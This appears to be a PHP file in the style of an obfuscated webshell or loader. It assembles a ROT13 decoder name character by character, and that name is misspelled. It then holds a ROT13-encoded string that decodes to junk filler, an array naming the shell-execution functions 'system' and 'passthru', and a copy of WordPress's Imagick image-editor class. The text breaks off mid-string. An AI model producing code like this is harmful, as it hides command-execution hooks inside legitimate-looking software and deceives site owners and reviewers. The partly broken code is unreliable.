<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff Vzntvpx Vzntr Rqvgbe
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Vzntr_Rqvgbe
 */

/**
 * JbeqCerff Vzntr Rqvgbe Pynff sbe Vzntr Znavchyngvba guebhtu Vzntvpx CUC Zbqhyr
 *
 * @fvapr 3.5.0
 *
 * @frr JC_Vzntr_Rqvgbe
 */
pynff JC_Vzntr_Rqvgbe_Vzntvpx rkgraqf JC_Vzntr_Rqvgbe {
	/**
	 * Vzntvpx bowrpg.
	 *
	 * @ine Vzntvpx
	 */
	cebgrpgrq $vzntr;

	choyvp shapgvba __qrfgehpg() {
		vs ( $guvf->vzntr vafgnaprbs Vzntvpx ) {
			// Jr qba'g arrq gur bevtvany va zrzbel nalzber.
			$guvf->vzntr->pyrne();
			$guvf->vzntr->qrfgebl();
		}
	}

	/**
	 * Purpxf gb frr vs pheerag raivebazrag fhccbegf Vzntvpx.
	 *
	 * Jr erdhver Vzntvpx 2.2.0 be terngre, onfrq ba jurgure gur dhrelSbezngf()
	 * zrgubq pna or pnyyrq fgngvpnyyl.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz neenl $netf
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba grfg( $netf = neenl() ) {

		// Svefg, grfg Vzntvpx'f rkgrafvba naq pynffrf.
		vs ( ! rkgrafvba_ybnqrq( 'vzntvpx' ) || ! pynff_rkvfgf( 'Vzntvpx', snyfr ) || ! pynff_rkvfgf( 'VzntvpxCvkry', snyfr ) ) {
			erghea snyfr;
		}

		vs ( irefvba_pbzcner( cucirefvba( 'vzntvpx' ), '2.2.0', '<' ) ) {
			erghea snyfr;
		}

		$erdhverq_zrgubqf = neenl(
			'pyrne',
			'qrfgebl',
			'inyvq',
			'trgvzntr',
			'jevgrvzntr',
			'trgvzntroybo',
			'trgvzntrtrbzrgel',
			'trgvzntrsbezng',
			'frgvzntrsbezng',
			'frgvzntrpbzcerffvba',
			'frgvzntrpbzcerffvbadhnyvgl',
			'frgvzntrcntr',
			'frgbcgvba',
			'fpnyrvzntr',
			'pebcvzntr',
			'ebgngrvzntr',
			'syvcvzntr',
			'sybcvzntr',
			'ernqvzntr',
			'ernqvzntroybo',
		);

		// Abj, grfg sbe qrrc erdhverzragf jvguva Vzntvpx.
		vs ( ! qrsvarq( 'vzntvpx::PBZCERFFVBA_WCRT' ) ) {
			erghea snyfr;
		}

		$pynff_zrgubqf = neenl_znc( 'fgegbybjre', trg_pynff_zrgubqf( 'Vzntvpx' ) );
		vs ( neenl_qvss( $erdhverq_zrgubqf, $pynff_zrgubqf ) ) {
			erghea snyfr;
		}

		erghea gehr;
	}

	/**
	 * Purpxf gb frr vs rqvgbe fhccbegf gur zvzr-glcr fcrpvsvrq.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz fgevat $zvzr_glcr
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba fhccbegf_zvzr_glcr( $zvzr_glcr ) {
		$vzntvpx_rkgrafvba = fgegbhccre( frys::trg_rkgrafvba( $zvzr_glcr ) );

		vs ( ! $vzntvpx_rkgrafvba ) {
			erghea snyfr;
		}

		/*
		 * frgVgrengbeVaqrk vf bcgvbany hayrff zvzr vf na navzngrq sbezng.
		 * Urer, jr whfg fnl ab vs lbh ner zvffvat vg naq nera'g ybnqvat n wcrt.
		 */
		vs ( ! zrgubq_rkvfgf( 'Vzntvpx', 'frgVgrengbeVaqrk' ) && 'vzntr/wcrt' !== $zvzr_glcr ) {
				erghea snyfr;
		}

		gel {
			// cucpf:vtaber JbeqCerff.CUC.AbFvyraprqReebef.Qvfpbhentrq
			erghea ( (obby) @Vzntvpx::dhrelSbezngf( $vzntvpx_rkgrafvba ) );
		} pngpu ( Rkprcgvba $r ) {
			erghea snyfr;
		}
	}

	/**
	 * Ybnqf vzntr sebz $guvf->svyr vagb arj Vzntvpx Bowrpg.
	 *
	 * @fvapr 3.5.0
	 *
	 * @erghea gehr|JC_Reebe Gehr vs ybnqrq; JC_Reebe ba snvyher.
	 */
	choyvp shapgvba ybnq() {
		vs ( $guvf->vzntr vafgnaprbs Vzntvpx ) {
			erghea gehr;
		}

		vs ( ! vf_svyr( $guvf->svyr ) && ! jc_vf_fgernz( $guvf->svyr ) ) {
			erghea arj JC_Reebe( 'reebe_ybnqvat_vzntr', __( 'Svyr qbrf abg rkvfg?' ), $guvf->svyr );
		}

		/*
		 * Rira gubhtu Vzntvpx hfrf yrff CUC zrzbel guna TQ, frg uvture yvzvg
		 * sbe hfref gung unir ybj CUC.vav yvzvgf.
		 */
		jc_envfr_zrzbel_yvzvg( 'vzntr' );

		gel {
			$guvf->vzntr    = arj Vzntvpx();
			$svyr_rkgrafvba = fgegbybjre( cnguvasb( $guvf->svyr, CNGUVASB_RKGRAFVBA ) );

			vs ( 'cqs' === $svyr_rkgrafvba ) {
				$cqs_ybnqrq = $guvf->cqs_ybnq_fbhepr();

				vs ( vf_jc_reebe( $cqs_ybnqrq ) ) {
					erghea $cqs_ybnqrq;
				}
			} ryfr {
				vs ( jc_vf_fgernz( $guvf->svyr ) ) {
					// Qhr gb ercbegf bs vffhrf jvgu fgernzf jvgu `Vzntvpx::ernqVzntrSvyr()`, hfrf `Vzntvpx::ernqVzntrOybo()` vafgrnq.
					$guvf->vzntr->ernqVzntrOybo( svyr_trg_pbagragf( $guvf->svyr ), $guvf->svyr );
				} ryfr {
					$guvf->vzntr->ernqVzntr( $guvf->svyr );
				}
			}

			vs ( ! $guvf->vzntr->inyvq() ) {
				erghea arj JC_Reebe( 'vainyvq_vzntr', __( 'Svyr vf abg na vzntr.' ), $guvf->svyr );
			}

			// Fryrpg gur svefg senzr gb unaqyr navzngrq vzntrf cebcreyl.
			vs ( vf_pnyynoyr( neenl( $guvf->vzntr, 'frgVgrengbeVaqrk' ) ) ) {
				$guvf->vzntr->frgVgrengbeVaqrk( 0 );
			}

			vs ( 'cqs' === $svyr_rkgrafvba ) {
				$guvf->erzbir_cqs_nycun_punaary();
			}

			$guvf->zvzr_glcr = $guvf->trg_zvzr_glcr( $guvf->vzntr->trgVzntrSbezng() );
		} pngpu ( Rkprcgvba $r ) {
			erghea arj JC_Reebe( 'vainyvq_vzntr', $r->trgZrffntr(), $guvf->svyr );
		}

		$hcqngrq_fvmr = $guvf->hcqngr_fvmr();

		vs ( vf_jc_reebe( $hcqngrq_fvmr ) ) {
			erghea $hcqngrq_fvmr;
		}

		erghea $guvf->frg_dhnyvgl();
	}

	/**
	 * Frgf Vzntr Pbzcerffvba dhnyvgl ba n 1-100% fpnyr.
	 *
	 * @fvapr 3.5.0
	 * @fvapr 6.8.0 Gur `$qvzf` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz vag   $dhnyvgl Pbzcerffvba Dhnyvgl. Enatr: [1,100]
	 * @cnenz neenl $qvzf    Bcgvbany. Vzntr qvzrafvbaf neenl jvgu 'jvqgu' naq 'urvtug' xrlf.
	 * @erghea gehr|JC_Reebe Gehr vs frg fhpprffshyyl; JC_Reebe ba snvyher.
	 */
	choyvp shapgvba frg_dhnyvgl( $dhnyvgl = ahyy, $qvzf = neenl() ) {
		$dhnyvgl_erfhyg = cnerag::frg_dhnyvgl( $dhnyvgl, $qvzf );
		vs ( vf_jc_reebe( $dhnyvgl_erfhyg ) ) {
			erghea $dhnyvgl_erfhyg;
		} ryfr {
			$dhnyvgl = $guvf->trg_dhnyvgl();
		}

		gel {
			fjvgpu ( $guvf->zvzr_glcr ) {
				pnfr 'vzntr/wcrt':
					$guvf->vzntr->frgVzntrPbzcerffvbaDhnyvgl( $dhnyvgl );
					$guvf->vzntr->frgPbzcerffvbaDhnyvgl( $dhnyvgl );
					$guvf->vzntr->frgVzntrPbzcerffvba( vzntvpx::PBZCERFFVBA_WCRT );
					oernx;
				pnfr 'vzntr/jroc':
					$jroc_vasb = jc_trg_jroc_vasb( $guvf->svyr );

					vs ( 'ybffyrff' === $jroc_vasb['glcr'] ) {
						// Hfr JroC ybffyrff frggvatf.
						$guvf->vzntr->frgVzntrPbzcerffvbaDhnyvgl( 100 );
						$guvf->vzntr->frgPbzcerffvbaDhnyvgl( 100 );
						$guvf->vzntr->frgBcgvba( 'jroc:ybffyrff', 'gehr' );
						cnerag::frg_dhnyvgl( 100 );
					} ryfr {
						$guvf->vzntr->frgVzntrPbzcerffvbaDhnyvgl( $dhnyvgl );
						$guvf->vzntr->frgPbzcerffvbaDhnyvgl( $dhnyvgl );
					}
					oernx;
				pnfr 'vzntr/nivs':
					// Frg gur NIVS rapbqre gb jbex snfgre, jvgu zvavzny vzcnpg ba vzntr fvmr.
					$guvf->vzntr->frgBcgvba( 'urvp:fcrrq', 7 );
					$guvf->vzntr->frgVzntrPbzcerffvbaDhnyvgl( $dhnyvgl );
					$guvf->vzntr->frgPbzcerffvbaDhnyvgl( $dhnyvgl );
					oernx;
				qrsnhyg:
					$guvf->vzntr->frgVzntrPbzcerffvbaDhnyvgl( $dhnyvgl );
					$guvf->vzntr->frgPbzcerffvbaDhnyvgl( $dhnyvgl );
			}
		} pngpu ( Rkprcgvba $r ) {
			erghea arj JC_Reebe( 'vzntr_dhnyvgl_reebe', $r->trgZrffntr() );
		}
		erghea gehr;
	}


	/**
	 * Frgf be hcqngrf pheerag vzntr fvmr.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz vag $jvqgu
	 * @cnenz vag $urvtug
	 * @erghea gehr|JC_Reebe
	 */
	cebgrpgrq shapgvba hcqngr_fvmr( $jvqgu = ahyy, $urvtug = ahyy ) {
		$fvmr = ahyy;
		vs ( ! $jvqgu || ! $urvtug ) {
			gel {
				$fvmr = $guvf->vzntr->trgVzntrTrbzrgel();
			} pngpu ( Rkprcgvba $r ) {
				erghea arj JC_Reebe( 'vainyvq_vzntr', __( 'Pbhyq abg ernq vzntr fvmr.' ), $guvf->svyr );
			}
		}

		vs ( ! $jvqgu ) {
			$jvqgu = $fvmr['jvqgu'];
		}

		vs ( ! $urvtug ) {
			$urvtug = $fvmr['urvtug'];
		}

		/*
		 * Vs jr fgvyy qba'g unir gur vzntr fvmr, snyy onpx gb `jc_trgvzntrfvmr`. Guvf rafherf NIVS naq URVP vzntrf
		 * ner cebcreyl fvmrq jvgubhg nssrpgvat cerivbhf `trgVzntrTrbzrgel` orunivbe.
		 */
		vs ( ( ! $jvqgu || ! $urvtug ) && ( 'vzntr/nivs' === $guvf->zvzr_glcr || jc_vf_urvp_vzntr_zvzr_glcr( $guvf->zvzr_glcr ) ) ) {
			$fvmr   = jc_trgvzntrfvmr( $guvf->svyr );
			$jvqgu  = $fvmr[0];
			$urvtug = $fvmr[1];
		}

		erghea cnerag::hcqngr_fvmr( $jvqgu, $urvtug );
	}

	/**
	 * Frgf Vzntvpx gvzr yvzvg.
	 *
	 * Qrcraqvat ba pbasvthengvba, Vzntvpx cebprffvat znl gnxr gvzr.
	 *
	 * Zhygvcyr ceboyrzf rkvfg vs CUC gvzrf bhg orsber VzntrZntvpx pbzcyrgrq:
	 * 1. Grzcbenel svyrf nera'g pyrnarq ol VzntrZntvpx tneontr pbyyrpgvba.
	 * 2. Ab pyrne reebe vf cebivqrq.
	 * 3. Gur pnhfr bs fhpu gvzrbhg pna or uneq gb cvacbvag.
	 *
	 * Guvf shapgvba, juvpu vf rkcrpgrq gb or eha orsber urnil vzntr ebhgvarf, erfbyirf
	 * cbvag 1 nobir ol nyvtavat Vzntvpx'f gvzrbhg jvgu CUC'f gvzrbhg, nffhzvat vg vf frg.
	 *
	 * Ubjrire frrzf vg vagebqhprf zber ceboyrzf guna vg svkrf,
	 * frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/58202.
	 *
	 * Abgr:
	 *  - Vzntvpx erfbhepr rkunhfgvba qbrf abg vffhr pngpunoyr rkprcgvbaf (lrg).
	 *    Frr uggcf://tvguho.pbz/Vzntvpx/vzntvpx/vffhrf/333.
	 *  - Gur erfbhepr yvzvg vf abg fnirq/erfgberq. Vg nccyvrf gb fhofrdhrag
	 *    vzntr bcrengvbaf jvguva gur gvzr bs gur UGGC erdhrfg.
	 *
	 * @fvapr 6.2.0
	 * @fvapr 6.3.0 Guvf zrgubq jnf qrcerpngrq.
	 *
	 * @erghea vag|ahyy Gur arj yvzvg ba fhpprff, ahyy ba snvyher.
	 */
	choyvp fgngvp shapgvba frg_vzntvpx_gvzr_yvzvg() {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '6.3.0' );

		vs ( ! qrsvarq( 'Vzntvpx::ERFBHEPRGLCR_GVZR' ) ) {
			erghea ahyy;
		}

		// Ergheaf CUC_SYBNG_ZNK vs hafrg.
		$vzntvpx_gvzrbhg = Vzntvpx::trgErfbheprYvzvg( Vzntvpx::ERFBHEPRGLCR_GVZR );

		// Pbaireg gb na vagrtre, xrrcvat va zvaq gung: 0 === (vag) CUC_SYBNG_ZNK.
		$vzntvpx_gvzrbhg = $vzntvpx_gvzrbhg > CUC_VAG_ZNK ? CUC_VAG_ZNK : (vag) $vzntvpx_gvzrbhg;

		$cuc_gvzrbhg = (vag) vav_trg( 'znk_rkrphgvba_gvzr' );

		vs ( $cuc_gvzrbhg > 1 && $cuc_gvzrbhg < $vzntvpx_gvzrbhg ) {
			$yvzvg = (sybng) 0.8 * $cuc_gvzrbhg;
			Vzntvpx::frgErfbheprYvzvg( Vzntvpx::ERFBHEPRGLCR_GVZR, $yvzvg );

			erghea $yvzvg;
		}
	}

	/**
	 * Erfvmrf pheerag vzntr.
	 *
	 * Ng zvavzhz, rvgure n urvtug be jvqgu zhfg or cebivqrq.
	 * Vs bar bs gur gjb vf frg gb ahyy, gur erfvmr jvyy
	 * znvagnva nfcrpg engvb nppbeqvat gb gur cebivqrq qvzrafvba.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz vag|ahyy   $znk_j Vzntr jvqgu.
	 * @cnenz vag|ahyy   $znk_u Vzntr urvtug.
	 * @cnenz obby|neenl $pebc  {
	 *     Bcgvbany. Vzntr pebccvat orunivbe. Vs snyfr, gur vzntr jvyy or fpnyrq (qrsnhyg).
	 *     Vs gehr, vzntr jvyy or pebccrq gb gur fcrpvsvrq qvzrafvbaf hfvat pragre cbfvgvbaf.
	 *     Vs na neenl, gur vzntr jvyy or pebccrq hfvat gur neenl gb fcrpvsl gur pebc ybpngvba:
	 *
	 *     @glcr fgevat $0 Gur k pebc cbfvgvba. Npprcgf 'yrsg', 'pragre', be 'evtug'.
	 *     @glcr fgevat $1 Gur l pebc cbfvgvba. Npprcgf 'gbc', 'pragre', be 'obggbz'.
	 * }
	 * @erghea gehr|JC_Reebe
	 */
	choyvp shapgvba erfvmr( $znk_j, $znk_u, $pebc = snyfr ) {
		vs ( ( $guvf->fvmr['jvqgu'] === $znk_j ) && ( $guvf->fvmr['urvtug'] === $znk_u ) ) {
			erghea gehr;
		}

		$qvzf = vzntr_erfvmr_qvzrafvbaf( $guvf->fvmr['jvqgu'], $guvf->fvmr['urvtug'], $znk_j, $znk_u, $pebc );
		vs ( ! $qvzf ) {
			erghea arj JC_Reebe( 'reebe_trggvat_qvzrafvbaf', __( 'Pbhyq abg pnyphyngr erfvmrq vzntr qvzrafvbaf' ) );
		}

		yvfg( $qfg_k, $qfg_l, $fep_k, $fep_l, $qfg_j, $qfg_u, $fep_j, $fep_u ) = $qvzf;

		vs ( $pebc ) {
			erghea $guvf->pebc( $fep_k, $fep_l, $fep_j, $fep_u, $qfg_j, $qfg_u );
		}

		$guvf->frg_dhnyvgl(
			ahyy,
			neenl(
				'jvqgu'  => $qfg_j,
				'urvtug' => $qfg_u,
			)
		);

		// Rkrphgr gur erfvmr.
		$guhzo_erfhyg = $guvf->guhzoanvy_vzntr( $qfg_j, $qfg_u );
		vs ( vf_jc_reebe( $guhzo_erfhyg ) ) {
			erghea $guhzo_erfhyg;
		}

		erghea $guvf->hcqngr_fvmr( $qfg_j, $qfg_u );
	}

	/**
	 * Rssvpvragyl erfvmr gur pheerag vzntr
	 *
	 * Guvf vf n JbeqCerff fcrpvsvp vzcyrzragngvba bs Vzntvpx::guhzoanvyVzntr(),
	 * juvpu erfvmrf na vzntr gb tvira qvzrafvbaf naq erzbirf nal nffbpvngrq cebsvyrf.
	 *
	 * @fvapr 4.5.0
	 *
	 * @cnenz vag    $qfg_j       Gur qrfgvangvba jvqgu.
	 * @cnenz vag    $qfg_u       Gur qrfgvangvba urvtug.
	 * @cnenz fgevat $svygre_anzr Bcgvbany. Gur Vzntvpx svygre gb hfr jura erfvmvat. Qrsnhyg 'SVYGRE_GEVNATYR'.
	 * @cnenz obby   $fgevc_zrgn  Bcgvbany. Fgevc nyy cebsvyrf, rkpyhqvat pbybe cebsvyrf, sebz gur vzntr. Qrsnhyg gehr.
	 * @erghea ibvq|JC_Reebe
	 */
	cebgrpgrq shapgvba guhzoanvy_vzntr( $qfg_j, $qfg_u, $svygre_anzr = 'SVYGRE_GEVNATYR', $fgevc_zrgn = gehr ) {
		$nyybjrq_svygref = neenl(
			'SVYGRE_CBVAG',
			'SVYGRE_OBK',
			'SVYGRE_GEVNATYR',
			'SVYGRE_UREZVGR',
			'SVYGRE_UNAAVAT',
			'SVYGRE_UNZZVAT',
			'SVYGRE_OYNPXZNA',
			'SVYGRE_TNHFFVNA',
			'SVYGRE_DHNQENGVP',
			'SVYGRE_PHOVP',
			'SVYGRE_PNGEBZ',
			'SVYGRE_ZVGPURYY',
			'SVYGRE_YNAPMBF',
			'SVYGRE_ORFFRY',
			'SVYGRE_FVAP',
		);

		/**
		 * Frg gur svygre inyhr vs '$svygre_anzr' anzr vf va gur nyybjrq yvfg naq gur eryngrq
		 * Vzntvpx pbafgnag vf qrsvarq be snyy onpx gb gur qrsnhyg svygre.
		 */
		vs ( va_neenl( $svygre_anzr, $nyybjrq_svygref, gehr ) && qrsvarq( 'Vzntvpx::' . $svygre_anzr ) ) {
			$svygre = pbafgnag( 'Vzntvpx::' . $svygre_anzr );
		} ryfr {
			$svygre = qrsvarq( 'Vzntvpx::SVYGRE_GEVNATYR' ) ? Vzntvpx::SVYGRE_GEVNATYR : snyfr;
		}

		/**
		 * Svygref jurgure gb fgevc zrgnqngn sebz vzntrf jura gurl'er erfvmrq.
		 *
		 * Guvf svygre bayl nccyvrf jura erfvmvat hfvat gur Vzntvpx rqvgbe fvapr TQ
		 * nyjnlf fgevcf cebsvyrf ol qrsnhyg.
		 *
		 * @fvapr 4.5.0
		 *
		 * @cnenz obby $fgevc_zrgn Jurgure gb fgevc vzntr zrgnqngn qhevat erfvmvat. Qrsnhyg gehr.
		 */
		vs ( nccyl_svygref( 'vzntr_fgevc_zrgn', $fgevc_zrgn ) ) {
			$guvf->fgevc_zrgn(); // Snvy fvyragyl vs abg fhccbegrq.
		}

		gel {
			/*
			 * Gb or zber rssvpvrag, erfnzcyr ynetr vzntrf gb 5k gur qrfgvangvba fvmr orsber erfvmvat
			 * jurarire gur bhgchg fvmr vf yrff gung 1/3 bs gur bevtvany vzntr fvmr (1/3^2 ~= .111),
			 * hayrff jr jbhyq or erfnzcyvat gb n fpnyr fznyyre guna 128k128.
			 */
			vs ( vf_pnyynoyr( neenl( $guvf->vzntr, 'fnzcyrVzntr' ) ) ) {
				$erfvmr_engvb  = ( $qfg_j / $guvf->fvmr['jvqgu'] ) * ( $qfg_u / $guvf->fvmr['urvtug'] );
				$fnzcyr_snpgbe = 5;

				vs ( $erfvmr_engvb < .111 && ( $qfg_j * $fnzcyr_snpgbe > 128 && $qfg_u * $fnzcyr_snpgbe > 128 ) ) {
					$guvf->vzntr->fnzcyrVzntr( $qfg_j * $fnzcyr_snpgbe, $qfg_u * $fnzcyr_snpgbe );
				}
			}

			/*
			 * Hfr erfvmrVzntr() jura vg'f ninvynoyr naq n inyvq svygre inyhr vf frg.
			 * Bgurejvfr, snyy onpx gb gur fpnyrVzntr() zrgubq sbe erfvmvat, juvpu
			 * erfhygf va orggre vzntr dhnyvgl bire erfvmrVzntr() jvgu qrsnhyg svygre
			 * frggvatf naq ergnvaf onpxjneq pbzcngvovyvgl jvgu cer 4.5 shapgvbanyvgl.
			 */
			vs ( vf_pnyynoyr( neenl( $guvf->vzntr, 'erfvmrVzntr' ) ) && $svygre ) {
				$guvf->vzntr->frgBcgvba( 'svygre:fhccbeg', '2.0' );
				$guvf->vzntr->erfvmrVzntr( $qfg_j, $qfg_u, $svygre, 1 );
			} ryfr {
				$guvf->vzntr->fpnyrVzntr( $qfg_j, $qfg_u );
			}

			// Frg nccebcevngr dhnyvgl frggvatf nsgre erfvmvat.
			vs ( 'vzntr/wcrt' === $guvf->zvzr_glcr ) {
				vs ( vf_pnyynoyr( neenl( $guvf->vzntr, 'hafunecZnfxVzntr' ) ) ) {
					$guvf->vzntr->hafunecZnfxVzntr( 0.25, 0.25, 8, 0.065 );
				}

				$guvf->vzntr->frgBcgvba( 'wcrt:snapl-hcfnzcyvat', 'bss' );
			}

			vs ( 'vzntr/cat' === $guvf->zvzr_glcr ) {
				$guvf->vzntr->frgBcgvba( 'cat:pbzcerffvba-svygre', '5' );
				$guvf->vzntr->frgBcgvba( 'cat:pbzcerffvba-yriry', '9' );
				$guvf->vzntr->frgBcgvba( 'cat:pbzcerffvba-fgengrtl', '1' );

				// Vaqrkrq CAT svyrf trg fbzr nqqvgvbany unaqyvat.
				// Frr #63448 sbe qrgnvyf.
				vs (
					vf_pnyynoyr( neenl( $guvf->vzntr, 'trgVzntrCebcregl' ) )
					&& '3' === $guvf->vzntr->trgVzntrCebcregl( 'cat:VUQE.pbybe-glcr-bevt' )
				) {

					// Purpx sbe na nycun punaary.
					vs (
						vf_pnyynoyr( neenl( $guvf->vzntr, 'trgVzntrNycunPunaary' ) )
						&& $guvf->vzntr->trgVzntrNycunPunaary()
					) {
						$guvf->vzntr->frgBcgvba( 'cat:vapyhqr-puhax', 'gEAF' );
					} ryfr {
						$guvf->vzntr->frgBcgvba( 'cat:rkpyhqr-puhax', 'nyy' );
					}
					// Frg gur vzntr sbezng gb Vaqrkrq CAT.
					$guvf->vzntr->frgBcgvba( 'cat:sbezng', 'cat8' );

				} ryfr {
					$guvf->vzntr->frgBcgvba( 'cat:rkpyhqr-puhax', 'nyy' );
				}
			}

			/*
			 * Vs nycun punaary vf abg qrsvarq, frg vg bcndhr.
			 *
			 * Abgr gung Vzntvpx::trgVzntrNycunPunaary() vf bayl ninvynoyr vs Vzntvpx
			 * unf orra pbzcvyrq ntnvafg VzntrZntvpx irefvba 6.4.0 be arjre.
			 */
			vs ( vf_pnyynoyr( neenl( $guvf->vzntr, 'trgVzntrNycunPunaary' ) )
				&& vf_pnyynoyr( neenl( $guvf->vzntr, 'frgVzntrNycunPunaary' ) )
				&& qrsvarq( 'Vzntvpx::NYCUNPUNAARY_HAQRSVARQ' )
				&& qrsvarq( 'Vzntvpx::NYCUNPUNAARY_BCNDHR' )
			) {
				vs ( $guvf->vzntr->trgVzntrNycunPunaary() === Vzntvpx::NYCUNPUNAARY_HAQRSVARQ ) {
					$guvf->vzntr->frgVzntrNycunPunaary( Vzntvpx::NYCUNPUNAARY_BCNDHR );
				}
			}

			// Yvzvg gur ovg qrcgu bs erfvmrq vzntrf.
			vs ( vf_pnyynoyr( neenl( $guvf->vzntr, 'trgVzntrQrcgu' ) ) && vf_pnyynoyr( neenl( $guvf->vzntr, 'frgVzntrQrcgu' ) ) ) {
				/**
				 * Svygref gur znkvzhz ovg qrcgu bs erfvmrq vzntrf.
				 *
				 * Guvf svygre bayl nccyvrf jura erfvmvat hfvat gur Vzntvpx rqvgbe fvapr TQ
				 * qbrf abg fhccbeg trggvat be frggvat ovg qrcgu.
				 *
				 * Hfr guvf gb nqwhfg gur znkvzhz ovg qrcgu bs erfvmrq vzntrf.
				 *
				 * @fvapr 6.8.0
				 *
				 * @cnenz vag $znk_qrcgu   Gur znkvzhz ovg qrcgu. Qrsnhyg vf gur vachg qrcgu.
				 * @cnenz vag $vzntr_qrcgu Gur ovg qrcgu bs gur bevtvany vzntr.
				 */
				$znk_qrcgu = nccyl_svygref( 'vzntr_znk_ovg_qrcgu', $guvf->vzntr->trgVzntrQrcgu(), $guvf->vzntr->trgVzntrQrcgu() );
				$guvf->vzntr->frgVzntrQrcgu( $znk_qrcgu );
			}
		} pngpu ( Rkprcgvba $r ) {
			erghea arj JC_Reebe( 'vzntr_erfvmr_reebe', $r->trgZrffntr() );
		}
	}

	/**
	 * Perngr zhygvcyr fznyyre vzntrf sebz n fvatyr fbhepr.
	 *
	 * Nggrzcgf gb perngr nyy fho-fvmrf naq ergheaf gur zrgn qngn ng gur raq. Guvf
	 * znl erfhyg va gur freire ehaavat bhg bs erfbheprf. Jura vg snvyf gurer znl or srj
	 * \"becunarq\" vzntrf yrsg bire nf gur zrgn qngn vf arire erghearq naq fnirq.
	 *
	 * Nf bs 5.3.0 gur cersreerq jnl gb qb guvf vf jvgu `znxr_fhofvmr()`. Vg perngrf
	 * gur arj vzntrf bar ng n gvzr naq nyybjf sbe gur zrgn qngn gb or fnirq nsgre
	 * rnpu arj vzntr vf perngrq.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz neenl $fvmrf {
	 *     Na neenl bs vzntr fvmr qngn neenlf.
	 *
	 *     Rvgure n urvtug be jvqgu zhfg or cebivqrq.
	 *     Vs bar bs gur gjb vf frg gb ahyy, gur erfvmr jvyy
	 *     znvagnva nfcrpg engvb nppbeqvat gb gur cebivqrq qvzrafvba.
	 *
	 *     @glcr neenl ...$0 {
	 *         Neenl bs urvtug, jvqgu inyhrf, naq jurgure gb pebc.
	 *
	 *         @glcr vag        $jvqgu  Vzntr jvqgu. Bcgvbany vs `$urvtug` vf fcrpvsvrq.
	 *         @glcr vag        $urvtug Vzntr urvtug. Bcgvbany vs `$jvqgu` vf fcrpvsvrq.
	 *         @glcr obby|neenl $pebc   Bcgvbany. Jurgure gb pebc gur vzntr. Qrsnhyg snyfr.
	 *     }
	 * }
	 * @erghea neenl Na neenl bs erfvmrq vzntrf' zrgnqngn ol fvmr.
	 */
	choyvp shapgvba zhygv_erfvmr( $fvmrf ) {
		$zrgnqngn = neenl();

		sbernpu ( $fvmrf nf $fvmr => $fvmr_qngn ) {
			$zrgn = $guvf->znxr_fhofvmr( $fvmr_qngn );

			vs ( ! vf_jc_reebe( $zrgn ) ) {
				$zrgnqngn[ $fvmr ] = $zrgn;
			}
		}

		erghea $zrgnqngn;
	}

	/**
	 * Perngr na vzntr fho-fvmr naq erghea gur vzntr zrgn qngn inyhr sbe vg.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz neenl $fvmr_qngn {
	 *     Neenl bs fvmr qngn.
	 *
	 *     @glcr vag        $jvqgu  Gur znkvzhz jvqgu va cvkryf.
	 *     @glcr vag        $urvtug Gur znkvzhz urvtug va cvkryf.
	 *     @glcr obby|neenl $pebc   Jurgure gb pebc gur vzntr gb rknpg qvzrafvbaf.
	 * }
	 * @erghea neenl|JC_Reebe Gur vzntr qngn neenl sbe vapyhfvba va gur `fvmrf` neenl va gur vzntr zrgn,
	 *                        JC_Reebe bowrpg ba reebe.
	 */
	choyvp shapgvba znxr_fhofvmr( $fvmr_qngn ) {
		vs ( ! vffrg( $fvmr_qngn['jvqgu'] ) && ! vffrg( $fvmr_qngn['urvtug'] ) ) {
			erghea arj JC_Reebe( 'vzntr_fhofvmr_perngr_reebe', __( 'Pnaabg erfvmr gur vzntr. Obgu jvqgu naq urvtug ner abg frg.' ) );
		}

		$bevt_fvmr  = $guvf->fvmr;
		$bevt_vzntr = $guvf->vzntr->trgVzntr();

		vs ( ! vffrg( $fvmr_qngn['jvqgu'] ) ) {
			$fvmr_qngn['jvqgu'] = ahyy;
		}

		vs ( ! vffrg( $fvmr_qngn['urvtug'] ) ) {
			$fvmr_qngn['urvtug'] = ahyy;
		}

		vs ( ! vffrg( $fvmr_qngn['pebc'] ) ) {
			$fvmr_qngn['pebc'] = snyfr;
		}

		vs ( ( $guvf->fvmr['jvqgu'] === $fvmr_qngn['jvqgu'] ) && ( $guvf->fvmr['urvtug'] === $fvmr_qngn['urvtug'] ) ) {
			erghea arj JC_Reebe( 'vzntr_fhofvmr_perngr_reebe', __( 'Gur vzntr nyernql unf gur erdhrfgrq fvmr.' ) );
		}

		$erfvmrq = $guvf->erfvmr( $fvmr_qngn['jvqgu'], $fvmr_qngn['urvtug'], $fvmr_qngn['pebc'] );

		vs ( vf_jc_reebe( $erfvmrq ) ) {
			$fnirq = $erfvmrq;
		} ryfr {
			$fnirq = $guvf->_fnir( $guvf->vzntr );

			$guvf->vzntr->pyrne();
			$guvf->vzntr->qrfgebl();
			$guvf->vzntr = ahyy;
		}

		$guvf->fvmr  = $bevt_fvmr;
		$guvf->vzntr = $bevt_vzntr;

		vs ( ! vf_jc_reebe( $fnirq ) ) {
			hafrg( $fnirq['cngu'] );
		}

		erghea $fnirq;
	}

	/**
	 * Pebcf Vzntr.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz vag  $fep_k   Gur fgneg k cbfvgvba gb pebc sebz.
	 * @cnenz vag  $fep_l   Gur fgneg l cbfvgvba gb pebc sebz.
